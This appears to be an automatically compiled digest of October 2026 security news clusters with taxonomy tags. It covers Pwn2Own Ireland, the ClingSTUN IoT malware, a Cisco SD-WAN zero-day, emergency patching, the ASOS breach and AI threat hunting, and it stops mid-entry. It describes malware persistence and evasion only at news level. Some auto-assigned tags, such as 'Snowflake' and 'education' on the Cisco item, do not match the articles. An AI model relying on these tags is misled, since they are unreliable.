Infosecurity Magazine Home » News » Pwn2Own Hackers Find 32 Zero-Day Vulnerabilities on Day One Pwn2Own Hackers Find 32 Zero-Day Vulnerabilities on Day One News 7 October 2026 Written by Phil Muncaster UK / EMEA News Reporter , Infosecurity Magazine Email Phil Follow @philmuncaster Some of the world’s top ethical hackers descended on the Irish city of Cork in an event that began on October 6, where they have already discovered dozens of zero-day flaws in the latest Pwn2Own Ireland. The hacking competition pits teams against each other in a contest to see who can unearth the most novel vulnerabilities. On the first day of the Zero Day Initiative’s Pwn2Own Ireland 2026, teams targeted smartphones, smart home devices, printers, and AI tools like OpenAI Codex and LiteLLM. Their total haul was 32 zero-day vulnerabilities and over $368,000 in prize money, as well as a trove of “Master of Pwn” points which will be totted up at the end of the competition. Read more on Pwn2Own: Security Researchers Find 47 Zero-Days at Pwn2Own Berlin. Day one saw several successes, including: @_McCaulay combined an out-of-bounds write and a format string(!) bug to exploit the Sonos Era 300 Taisic Yun of Xint used an improper input validation bug and code injection to get a reverse shell on LiteLLM Vũ Chí Thành and Huỳnh Đức Tin of VinSOC found seven zero days during their exploit of Philips Hue Bridge Pro Thanh Do of Team Confused used a single use-after-free exploit on the Lexmark CX532adwe Nam Nguyen, Thanh Vu, and Tin Huynh of VinSOC combined five zero days to exploit the Oracle Autonomous AI Database Ikotas Labs, Inc. used a single argument injection bug to exploit OpenAI Codex Interrupt Labs used an OOB read and an OOB write to exploit the Garmin Index BPM Ethical Hacking to the Fore Hacking competitions like this are arguably more important than ever as vendors struggle to find vulnerabilities in their products before their adversaries do. As a part of the Zero Day Initiative (ZDI), Pwn2Own findings are responsibly disclosed to the relevant vendors, who then have 90 days to release updates before the ZDI publishes them. AI-enabled tools are increasingly being used in an offensive capacity to research exploits, either for novel bugs or recently published flaws. According to Google , vulnerability disclosures doubled from 5045 in January 2026 to 10,477 in July, reaching 10,740 in August 2026. Exploited vulnerabilities rose from an average of 10.5 a month in 2025 to 18 a month so far in 2026. AI discovery also skews to higher impact flaws: 50% of vulnerabilities Google identified as likely AI-discovered resulted in remote code execution, against 26% of other CVEs. However, separate research claims that just 1% of AI-discovered vulnerabilities have been exploited in the wild. Pwn2Own continues on October 7 and 8, when the Master of Pwn will be announced. You may also like Researchers Discover Over 70 Zero-Day Bugs at Pwn2Own Ireland News 28 October 2024 Researchers Find 63 Zero-Day Bugs at Latest Pwn2Own News 12 December 2022 Security Researchers Win Second Tesla At Pwn2Own News 21 March 2024 Security Researchers Find 47 Zero-Days at Pwn2Own Berlin News 18 May 2026 HackerOne Exceeds $300m in Bug Bounty Payments News 30 October 2023 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice ASOS Customers Receive Bizarre “Hacked” Message Amid Suspected Snowflake Compromise News 6 October 2026 1 Frontline Education Breach Impacts K-12 School District Staff News 5 October 2026 2 Google Suspends Open-Source Bug Bounty Due to AI Vulnerability Reports News 5 October 2026 3 ClingSTUN Malware Turns Unpatched IoT Devices Into Proxy Nodes News 5 October 2026 4 Ransomware Affiliate Double-Crosses RaaS Operator to Steal Victim Funds News 6 October 2026 5 New Stealthy Linux Backdoors Target Telecoms, Masquerade as Email Traffic News 5 October 2026 6 #Infosec2025: Cybersecurity Lessons From Maersk’s Former CISO News 5 June 2025 1 Who Authorized That
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Pwn2Own Hackers Find 32 Zero-Day Vulnerabilities on Day One
  - Published: 2026-10-07T09:25:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/pwn2own-hackers-32-zeroday/
  - Summary: Ethical hackers have already found 32 zero days in various products at Pwn2Own Ireland

### Cluster 5abaf61ca8 — score 10

- Title: ClingSTUN Malware Turns Unpatched IoT Devices Into Proxy Nodes
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-10-05T14:30:00+00:00
- Link: https://www.infosecurity-magazine.com/news/clingstun-backdoor-unpatched-iot/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng, web_shell_backdoor
- affected_industries: education, government
- affected_products: Ivanti, Snowflake
- cve_ids: CVE-2022-36553, CVE-2023-46805, CVE-2024-21887, CVE-2024-23625, CVE-2025-34035
- urgency_signals: actively_exploited, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, web_shell_backdoor, active_exploitation
- affected_industries: government, education
- affected_products: Snowflake, Ivanti
- cve_ids: CVE-2022-36553, CVE-2025-34035, CVE-2024-23625, CVE-2023-46805, CVE-2024-21887
- urgency_signals: actively_exploited, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
ClingSTUN exploits known IoT flaws and abuses public STUN servers to keep proxy access to devices
```

#### Full body

```
Infosecurity Magazine Home » News » ClingSTUN Malware Turns Unpatched IoT Devices Into Proxy Nodes ClingSTUN Malware Turns Unpatched IoT Devices Into Proxy Nodes News 5 October 2026 Written by Alessandro Mascellino News Reporter Email Alessandro Follow @a_mascellino A Linux proxy backdoor has been observed exploiting known, unpatched flaws in internet-facing IoT devices and abusing legitimate public STUN servers to keep compromised systems reachable as remotely controlled proxy nodes. FortiGuard Labs, which dubbed the malware ClingSTUN, said in research published on October 5 that it tracked the campaign across three periods, each with a different download server. The first lasted two days and relied on a single flaw, CVE-2022-36553 in Hytec Inter routers. In the second, the attackers switched to two vulnerability: CVE-2025-34035 in EnGenius's IoT cloud service and CVE-2024-23625 in D-Link's UPnP service. The operators then spread the malware through command injection flaws in Linear, Realtek, TP-Link, AVTECH and D-Link devices. In the third period, the attackers added more entry points, and FortiGuard's list now stands at 24 vulnerabilities, including Ivanti Connect Secure flaws CVE-2023-46805 and CVE-2024-21887 and newer bugs such as CVE-2026-36356 and CVE-2025-67038. STUN Traffic Blends With VoIP and WebRTC ClingSTUN works as a back-connect proxy . It sends STUN binding requests to public servers, 24 in the second version and 13 in the third, to discover its external address and port mappings and keep NAT bindings open, then periodically reports its group identifier and mapped ports to the same servers. Because the servers are legitimate, the traffic resembles normal VoIP and WebRTC communications. FortiGuard said how the operator obtains the mappings and pushes commands through NAT remains unverified, and warned against treating the STUN services as attacker-controlled infrastructure. The malware kills competing processes and watchdog timers, copies itself into system locations, modifies boot scripts for persistence and hides behind process information copied from the system's init process. It supports remote command execution and carries hard-coded exploits for seven more vulnerabilities, including flaws in Realtek's SDK and three DVR products, to spread itself. Read more on IoT malware: New Mirai-Based Linux Botnet 'Evooo1Bot' Turns Victims Into Proxies Defenders Weigh Containment Against Patching Louis Eichenbaum, federal CTO at ColorTokens warned. "ClingSTUN is another reminder that organizations cannot patch their way out of cyber risk." He argued for compensating controls around devices that cannot be fixed immediately, with microsegmentation to limit lateral movement. Meanwhile, John Gallagher, VP at IoT security firm Viakoo, disagreed on segmentation. "Believing that network segmentation provides security is a flawed assumption," he said, arguing instead for automated firmware remediation across multivendor IoT fleets. "Visibility alone will not save you here," he added. FortiGuard advised assessing STUN activity alongside suspicious processes, unexpected UDP connections and recurring keepalive traffic. The cybersecurity firm also urged organizations to inventory internet-facing devices, prioritize patches for actively exploited flaws and replace or isolate devices that no longer receive security updates. You may also like GoTitan Botnet and PrCtrl RAT Exploit Apache Vulnerability News 29 November 2023 MostereRAT Targets Windows Users With Stealth Tactics News 8 September 2025 Phishing Campaign Uses Havoc Framework to Control Infected Systems News 3 March 2025 Advanced ValleyRAT Campaign Hits Windows Users in China News 15 August 2024 SEO Poisoning Targets Chinese Users with Fake Software Sites News 15 September 2025 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice ASOS Customers Receive Bizarre “Hacked” Message Amid Suspected Snowflake Compromise News 6 October 2026 1 Frontline Education Br
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: ClingSTUN Malware Turns Unpatched IoT Devices Into Proxy Nodes
  - Published: 2026-10-05T14:30:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/clingstun-backdoor-unpatched-iot/
  - Summary: ClingSTUN exploits known IoT flaws and abuses public STUN servers to keep proxy access to devices

### Cluster 4e072e3956 — score 10

- Title: Critical Cisco Catalyst SD-WAN Zero-Day Under Active Exploitation
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-10-01T14:17:00+00:00
- Link: https://www.infosecurity-magazine.com/news/critical-cisco-catalyst-sdwan/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_industries: education
- affected_products: Snowflake
- cve_ids: CVE-2026-76460, CVE-2026-76504
- urgency_signals: actively_exploited, no_patch_yet, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_industries: education
- affected_products: Snowflake
- cve_ids: CVE-2026-76504, CVE-2026-76460
- urgency_signals: actively_exploited, zero_day, preauth_unauth, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Vulnerability in Cisco Catalyst SD-WAN Manager allows an unauthenticated, remote attacker to access systems with admin privileges
```

#### Full body

```
Infosecurity Magazine Home » News » Critical Cisco Catalyst SD-WAN Zero-Day Under Active Exploitation Critical Cisco Catalyst SD-WAN Zero-Day Under Active Exploitation News 1 October 2026 Written by Danny Palmer Contributing Writer , Infosecurity Magazine Cisco has issued an urgent security update to address a newly uncovered zero-day vulnerability in Cisco Catalyst SD-WAN Manager which has already been exploited in the wild. In a security advisory published on September 30, Cisco issued a warning about CVE-2026-76504, a vulnerability in the API session-based authentication management of Cisco Catalyst SD-WAN Manager which could allow an unauthenticated, remote attacker to access an affected system with privileges of the admin user. With a CVSS score of 9.8 the vulnerability is classed as critical. If it is not remediated immediately, it could result in widespread exploitation by malicious hackers, consequences of which could include data loss, system downtime or complete system takeover. Any Cisco Catalyst SD-WAN Manager systems with ports exposed to the internet are potentially at risk of compromise. CVE-2026-76504 Exploited in the Wild According to Cisco, CVE-2026-76504 is already under “active exploitation” and the company “strongly recommends that customers upgrade to a fixed software release to remediate this vulnerability”. There are no workarounds to remediate the vulnerability without applying the security update. The vulnerability has emerged as a result of improper handling of URI encoding in an HTTP request, which if exploited allows an unauthorised, remote attacker to bypass authentication rules via the use of a crafted HTTP request. Exploitation could allow the attacker to gain access to the API with the permissions of an administrator. With this functionality, an attacker could essentially compromise the whole network, allowing an unauthorized user to pivot throughout and alter and delete files and backups. The mitigation against CVE-2026-76504 has already been deployed to Cisco Catalyst SD-WAN Cloud Hosted environments. However, Cisco warned, “While this mitigation has been deployed and was proven successful in a test environment, customers should determine the applicability and effectiveness in their own environment and under their own use conditions.” Mitigation Advice: Audit Systems, Apply Patches In analysis of the vulnerability, Rapid7 urged organizations which use Cisco Catalyst SD-WAN Manager to upgrade to an appropriate fixed release without waiting for a regular patch cycle. “Because active exploitation has occurred, Rapid7 strongly recommends that organizations audit affected systems for compromise,” the company said in a blog post published on October 1. The US Cybersecurity Infrastructure and Security Agency (CISA) has added CVE-2026-76504 to its known exploited vulnerabilities (KEV) catalogue and recommended organizations to apply mitigations. Just last month, Cisco warned customers of about active exploitation of CVE-2026-76460 , a maximum severity flaw with a CVSS rating of 10 which affected its Cisco Identity Services Engine (ISE). You may also like CISA Warns of Exploited Critical Vulnerabilities in Cisco Identity Services Engine News 29 July 2025 Beyond Disclosure: Transforming Vulnerability Data Into Actionable Security News Feature 23 September 2024 NVD Leaves Exploited Vulnerabilities Unchecked News 23 May 2024 CISA Upgrades Vulnerability Reporting Platform with More Automation News 18 September 2026 Russian State Hackers Target Vulnerable Routers Worldwide, Joint Advisory Warns News 13 July 2026 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice ASOS Customers Receive Bizarre “Hacked” Message Amid Suspected Snowflake Compromise News 6 October 2026 1 Frontline Education Breach Impacts K-12 School District Staff News 5 October 2026 2 Google Suspends Open-Source Bug Bounty Due to AI Vulnerability Reports News 5 October 2026 3 ClingSTUN Malware Turns Unpatched IoT Devices
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Critical Cisco Catalyst SD-WAN Zero-Day Under Active Exploitation
  - Published: 2026-10-01T14:17:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/critical-cisco-catalyst-sdwan/
  - Summary: Vulnerability in Cisco Catalyst SD-WAN Manager allows an unauthenticated, remote attacker to access systems with admin privileges

### Cluster 7e0023e1fe — score 10

- Title: How to fix a bug in a fix
- Source: Google Project Zero (offensive_vulnerability_research)
- Published: 2026-10-06T07:00:00+00:00
- Link: https://projectzero.google/2026/10/emergency-patching.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- urgency_signals: emergency_patch
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- urgency_signals: emergency_patch
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Project Zero often works with software vendors to remediate the vulnerabilities we report and provide broader guidance on making software more secure. Some vendors express concern about potential scenarios in which they are unable to fix vulnerabilities that are causing immediate user harm, due to limitations in their patch delivery systems. Since Project Zero encounters a wide array of systems designed to protect users in the case of exceptional exploitation scenarios, both through vendor discussions and security reviews, we want to share what we’ve learned. This post provides an overview of systems in use by large vendors that allow them to remediate small volumes of vulnerabilities much faster than their typical update process. Our goal is to provide a reference for vendors seeking to implement or enhance the capabilities of such systems, and to encourage vendors to consider how they would fix an urgent vulnerability before they receive one.
```

#### Full body

```
Project Zero often works with software vendors to remediate the vulnerabilities we report and provide broader guidance on making software more secure. Some vendors express concern about potential scenarios in which they are unable to fix vulnerabilities that are causing immediate user harm, due to limitations in their patch delivery systems. Since Project Zero encounters a wide array of systems designed to protect users in the case of exceptional exploitation scenarios, both through vendor discussions and security reviews, we want to share what weâve learned. This post provides an overview of systems in use by large vendors that allow them to remediate small volumes of vulnerabilities much faster than their typical update process. Our goal is to provide a reference for vendors seeking to implement or enhance the capabilities of such systems, and to encourage vendors to consider how they would fix an urgent vulnerability before they receive one. Why patching takes time Patching a vulnerability typically involves the following stages: Triage â a vulnerability report is received, validated, prioritized and assigned to a specific developer to be fixed Patch development â a software development team writes, reviews and commits code that fixes the vulnerability Testing â the patch is tested to ensure the vulnerability is remediated and the software still functions correctly when the patch is applied. This can include formal testing by a test team, automated testing and alpha and beta testing where a patch is shipped to a limited group of users for feedback on normal use. Partner review â some software updates require review by third parties before they can be shipped, due to relationships between the software vendor and other organizations, for example, carrier acceptance for some mobile updates. Delivery â the patch is delivered to and installed by end users Activation â sometimes an additional step, such as a system restart, is needed to switch the system to the updated software Of course, this is a simplified picture. Patching can involve repeating steps, for example rewriting a patch if tests fail, or additional stages when third-party vendors are involved. However, this is a minimal set of steps most software updates require. The challenges of emergency patches While triage and patch development time contribute substantially to the speed at which vendors can generally patch vulnerabilities, they contribute less to emergency patch time. Triage is usually very fast in situations where vendors know they have an urgent problem, and patch development can be expedited based on priority. Only in rare circumstances, where a vulnerability is especially complex, or a vendorâs security team does not have a complete picture of their softwareâs components and who within their organization maintains them, have we seen urgent patches delayed in the triage or development phase. Likewise, partner agreements usually have exceptions for updates in emergency situations. Most vendorsâ patch speed is limited by the testing and delivery stages. Testing is important because all changes to software risk introducing unexpected behavior. The worst-case scenario is that inadequately tested software âbricksâ a device, causing it to malfunction in a way that it can no longer perform key functionality or receive software updates to remediate this. Buggy software updates have also led to situations where user data is corrupted or lost, and any decrease in software functionality after a security update makes users less likely to apply updates in the future. The potential cost to vendors of shipping poorly tested updates varies depending on the nature of the underlying software. For example, if a mobile application is rendered unusable due to an update that corrupts local data or prevents it from launching, users can easily install the next version via an app store, and their data is usually saved on a remote server, so costs are limited
```

#### Corroborating sources (1)

- **Google Project Zero** (offensive_vulnerability_research)
  - Title: How to fix a bug in a fix
  - Published: 2026-10-06T07:00:00+00:00
  - Link: https://projectzero.google/2026/10/emergency-patching.html
  - Summary: Project Zero often works with software vendors to remediate the vulnerabilities we report and provide broader guidance on making software more secure. Some vendors express concern about potential scenarios in which they are unable to fix vulnerabilities that are causing immediate user harm, due to limitations in their patch delivery systems. Since Project Zero encounters a wide array of systems designed to protect users in the case of exceptional exploitation scenarios, both through vendor discussions and security reviews, we want to share what we’ve learned. This post provides an overview of systems in use by large vendors that allow them to remediate small volumes of vulnerabilities much faster than their typical update process. Our goal is to provide a reference for vendors seeking to implement or enhance the capabilities of such systems, and to encourage vendors to consider how they would fix an urgent vulnerability before they receive one.

### Cluster c82a5c5007 — score 9

- Title: TTY Logs and the Data it Captures, (Sun, Oct 4th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-10-05T00:15:00+00:00
- Link: https://isc.sans.edu/diary/rss/33396
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
For an experiment, I created a script [ 1 ] that parses and send the TTY logs collected from actors or bots activity that run various commands after they successfully login the DShield sensor. Those TTY logs are sent daily at the end of each day to the DShield SIEM [ 2 ] to be correlated with all the data.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: TTY Logs and the Data it Captures, (Sun, Oct 4th)
  - Published: 2026-10-05T00:15:00+00:00
  - Link: https://isc.sans.edu/diary/rss/33396
  - Summary: For an experiment, I created a script [ 1 ] that parses and send the TTY logs collected from actors or bots activity that run various commands after they successfully login the DShield sensor. Those TTY logs are sent daily at the end of each day to the DShield SIEM [ 2 ] to be correlated with all the data.

### Cluster 30b7bfd4bf — score 9

- Title: How the Wiz Red Agent caught a Fortune 500 firm’s data exposure (that other tools missed)
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-10-07T14:53:27+00:00
- Link: https://www.wiz.io/blog/red-agent-financial-services-data-exposure
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: data_breach
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Traditional DSPM and classification tools scan from the inside out. Thinking like an attacker, the Red Agent found a public page exposing sensitive data in minutes.
```

#### Full body

```
At a Fortune 500 firm, a public web page was quietly serving sensitive data tied to one of the company's business units. No breach alert. No failed control. Just an exposure sitting in the open … the kind that, in most environments, goes unnoticed for months. Wiz Red Agent was the only tool in the organization's stack to catch it. Here's how the Fortune 500 financial services company, described it: Yesterday, the Wiz Red Agent uncovered a publicly facing web page hosting sensitive data related to one of our business units. In the past, this kind of exposure would have gone unnoticed for a length of time…Today, Wiz picked it up without problem, and as far as we can tell, was the only security tool we have that identified the finding. The Red Agent made it extremely easy to understand the situation at a glance, it correctly categorized the severity, and the Data Finding page included a dynamic summary of what was being exposed so we didn't need to audit it at length. That feedback highlights what modern security teams are up against. It's so easy now to build, spin up a new agent or connect data to an external service, but every new integration expands your attack surface. To ship AI confidently, teams can’t rely on static scans, they need unified context and autonomous defense working in real time. While organizations are eager to harness AI-driven development and automate business logic, security teams cannot rely on static configurations or periodic internal audits. In an environment where code and data move at lightning speed, the fundamental security question remains unchanged: Where is your sensitive data, who can reach it from the outside, and what could an attacker actually do with it right now? Answering that requires complete perimeter visibility and a proactive approach to continuous defense. Ask yourself how an attacker would view your environment, and use that intel strategically. Why Inside-Out Tooling Missed What Red Agent Caught Why was Wiz the only tool in the customer's stack to catch this? Traditional data security tools look strictly from the inside out. DSPM and classification engines crawl datastores, scan text, and generate an inventory of sensitive records. While knowing what data exists is essential, classification alone cannot answer the critical operational question: Is this data actually reachable and exploitable from the public internet? Conversely, traditional Attack Surface Management (ASM) and perimeter scanners look from the outside in, but they rely on rigid signatures, looking for known open ports, outdated software versions, or standard CVEs. They see a web server responding normally and move on, completely blind to what the payload behind that endpoint actually contains. Attackers operate in the space between those silos: They don't have access to your internal classification catalogs. They probe from the outside, mapping live paths to discover what is reachable and exploitable. According to Wiz Research, approximately 78% of high and critical exploitable cloud risks stem from information disclosure, leaked credentials, and excessive access. Red Agent closes this gap by operating as an AI-powered pentester. It continuously discovers your perimeter, tests accessible endpoints, and validates whether sensitive data is exposed to the public internet. What Red Agent actually did What truly set this finding apart was not just discovering an open URL, it was how the exposure was analyzed. Red Agent doesn't simply flag an endpoint and leave security teams guessing. When Red Agent encounters potentially sensitive data on an exposed endpoint, the agent itself invokes built-in, AI-powered classification. Instead of forcing engineers to manually dump files or parse raw HTTP responses, Red Agent: Analyzes the payload dynamically: Evaluates the structure and content of the exposed data in real time from the external perspective. Accurately assesses sensitivity & impact: Determines whether the data represen
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: How the Wiz Red Agent caught a Fortune 500 firm’s data exposure (that other tools missed)
  - Published: 2026-10-07T14:53:27+00:00
  - Link: https://www.wiz.io/blog/red-agent-financial-services-data-exposure
  - Summary: Traditional DSPM and classification tools scan from the inside out. Thinking like an attacker, the Red Agent found a public page exposing sensitive data in minutes.

### Cluster afa4dde99a — score 9

- Title: ASOS confirms data breach after “HACKED” in-app notifications
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-10-06T16:33:54+00:00
- Link: https://www.bleepingcomputer.com/news/security/asos-confirms-data-breach-after-hacked-in-app-notifications/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion
- affected_industries: education
- affected_products: Snowflake
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, data_breach
- affected_industries: education
- affected_products: Snowflake
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
UK fashion retailer ASOS confirmed a data breach Tuesday after hackers sent unauthorized push notifications through its mobile app while claiming to have stolen customer data from the company's Snowflake environment. [...]
```

#### Full body

```
ASOS confirms data breach after “HACKED” in-app notifications By Lawrence Abrams October 6, 2026 12:33 PM 0 UK fashion retailer ASOS confirmed a data breach Tuesday after hackers sent unauthorized push notifications through its mobile app while claiming to have stolen customer data from the company's Snowflake environment. ASOS is a large UK-based online fashion retailer that sells clothing, footwear, accessories, and beauty products to customers worldwide, including in the United States. ASOS has confirmed that third-party platforms used to communicate with customers were accessed without authorization and says basic personal information, including names and contact details, may have been exposed. The company is now displaying an in-app notice telling customers to disregard the unauthorized push alert and not to click or engage with the external third-party link it contained. Warning about notification now shown in ASOS app However, the company has not confirmed the threat actor's claim that its Snowflake environment was compromised or disclosed how many customers may be affected. ASOS says it does not believe payment-card information or account passwords were impacted. If you have any information regarding this incident or other undisclosed attacks, you can contact us confidentially via Signal at 646-961-3731 or at tips@bleepingcomputer.com. Hackers abuse ASOS mobile app The notifications began appearing at approximately 5:00 a.m. ET on Tuesday, with multiple BleepingComputer readers contacting us after receiving the alerts on their phones. "ASOS HACKED," reads the notification seen by BleepingComputer. "Dear Asos DPO and IT, we have fully compromised the Snowflake instance. Engage with us, or we will leak it." "ASOS HACKED" notification sent via the official ASOS mobile app Source: Reddit Numerous other ASOS customers also reported receiving the same notification on Reddit, indicating that the message reached many, if not all, mobile app users. The notification directs ASOS to a Telegram channel operated by a threat actor calling itself the "Xuanye group." In messages posted to the channel Tuesday morning, the threat actor claimed the breach did not affect payment information. However, the attackers later published a "FINAL STATEMENT," claiming that they stole customer information in the attack. "The affected organisation's app is safe to use. The incident involves customer information, it is safe on our server, and it will not be touched for a designated period," reads the group's message. "Considering the current situation regarding incident disclosure in the cyber security landscape, you can thank us for our generous clarity regarding this incident." The group did not disclose what customer information was allegedly stolen, how many customers were impacted, or provide evidence showing that it had compromised ASOS's Snowflake environment. BleepingComputer attempted to contact the threat actors about the breach, but the only contact point required payment. We did not continue as it is against our editorial guidelines to pay for information. Build your security blueprint for AI-powered attacks Join Mikko Hyppönen and security leaders from the NFL, CHANEL, and Atlassian for a two-hour digital summit on what AI-speed attacks change, what defenders should stop doing, and how to validate, decide, fix, and re-validate at machine speed. Save your seat Related Articles: Advantest confirms personal information stolen in ransomware attack Nikkei discloses breaches of employees’ Microsoft, Google email accounts Denmark population registry data breach affects 8.8 million people Frontline Education breach exposes school district employee data Hackers stole Pentagon personnel records of over 3 million people
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: ASOS confirms data breach after “HACKED” in-app notifications
  - Published: 2026-10-06T16:33:54+00:00
  - Link: https://www.bleepingcomputer.com/news/security/asos-confirms-data-breach-after-hacked-in-app-notifications/
  - Summary: UK fashion retailer ASOS confirmed a data breach Tuesday after hackers sent unauthorized push notifications through its mobile app while claiming to have stolen customer data from the company's Snowflake environment. [...]

### Cluster 40a27b291e — score 9

- Title: Agentic Hunting Needs Guardrails. Start With Your Methodology.
- Source: Intel 471 (ransomware_ecrime_financial_crime)
- Published: 2026-10-07T19:15:00+00:00
- Link: https://www.intel471.com/blog/agentic-hunting-needs-guardrails-start-with-your-methodology
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Is your team running each new threat report through AI to generate a hunt? The SANS 2026 Threat Hunting Survey found that usage of formally defined threat hunting methodologies fell for a second straight year, to 37%, down from 46% in 2025 and 51% in 2024.
```

#### Full body

```
Agentic Hunting Needs Guardrails. Start With Your Methodology. Oct 7, 2026 Automate to amplify your hunters, but be careful not to over-automate analyst reasoning. Is your team running each new threat report through AI to generate a hunt? They’ll get a reasonable hunt in seconds, but one only scoped to that threat report. The AI will also likely give a different answer on the second attempt. Left unchecked, this practice can create a wide gap in coverage the program doesn’t take into account. The SANS 2026 Threat Hunting Survey found that usage of formally defined threat hunting methodologies fell for a second straight year, to 37%, down from 46% in 2025 and 51% in 2024. A formally defined methodology generally means a documented, repeatable process covering how hunts are triggered and scoped, how hypotheses are written and how findings are handed off. Meanwhile, ad hoc approaches to hunting crept up to 39%, slightly outpacing formal methodologies. In ad hoc hunting, there is no written structure that everyone follows, no consistent hypothesis format, and no standard way to validate that the data needed for the hunt is being logged. SANS points to staffing as the likely main driver of this trend, with 38% saying available headcount drives which methodology gets used, while another 39% say it's a combination of staffing and methodology. Skills shortages are the top barrier for 45% of programs. The result, as SANS put it, is methodology bends to what people can handle rather than what’s most effective. While skilled hunters can thrive in ad hoc hunting, the program may suffer due to results that are hard to reproduce and measure. Source: SANS 2026 Threat Hunting Survey Another possible driver of ad hoc hunting is AI. "One thing we're watching is whether AI is unintentionally making ad hoc hunting easier to sustain," says Scott Poley, Senior Threat Hunt Manager at Intel 471. In talks and training sessions, he's increasingly hearing the default response to a new threat report is to run it through AI. "AI gives them a reasonable hunt for what's described in the report, but people skip the extra steps taken with a proper methodology. When AI lets you answer things faster, structured approaches can fall away." These processes are designed by experienced hunters to make hunts reusable and drive program maturity. A proper methodology adds four steps: narrowing the report to a specific behavior, researching and reproducing it, validating that the hunt detects it, and enriching it with what's known about the actor. All of this depends on behavioral evidence. A report about a malicious insider stealing account information gives a hunt a direction, but there are too many ways to achieve that goal to validate against. Knowing the actor used PowerShell to enumerate Active Directory accounts narrows it to a short list of commands. With the actual commands or tooling hashes, hunters can reproduce the behavior in a lab and build a hunt proven to find it. With a validated hunt, you know it will identify the behavior if it's present in logs, and you can explain why when it finds nothing. That's the work of making a hunt reliable and repeatable. "The craft is understanding the behavior behind the activity," says Poley. This structured approach is more important today as adversaries default to techniques that evade traditional, indicator-based detection. Living-off-the-land techniques topped every threat actor category hunters uncovered, according to the SANS 2026 data: 72.7% for nation-states, 63.4% for ransomware groups and 63.2% for organized crime. Signature-matching won't find threats that abuse legitimate admin tools and valid credentials. Well-scoped behavioral hunts can. "Our job isn't just to address the actor or the specific nuance in the report we're working from," adds Poley. "It's thinking about the permutations of that attack — how it could be changed slightly and still achieve the same thing." None of this means AI can’t be used. Pol
```

#### Corroborating sources (1)

- **Intel 471** (ransomware_ecrime_financial_crime)
  - Title: Agentic Hunting Needs Guardrails. Start With Your Methodology.
  - Published: 2026-10-07T19:15:00+00:00
  - Link: https://www.intel471.com/blog/agentic-hunting-needs-guardrails-start-with-your-methodology
  - Summary: Is your team running each new threat report through AI to generate a hunt? The SANS 2026 Threat Hunting Survey found that usage of formally defined threat hunting methodologies fell for a second straight year, to 37%, down from 46% in 2025 and 51% in 2024.

### Cluster 92b29f256d — score 9

- Title: Possible Vulnerability in Apple’s Automatic Reboot
- Source: Schneier on Security (practitioner_analysis)
- Published: 2026-10-06T11:06:46+00:00
- Link: https://www.schneier.com/blog/archives/2026/10/possible-vulnerability-in-apples-automatic-reboot.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: manufacturing_industrial
- content_type: vulnerability_disclosure
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- affected_industries: manufacturing_industrial
- content_type: vulnerability_disclosure
- confidence_tier: tier_3_analysis

#### Summary

```
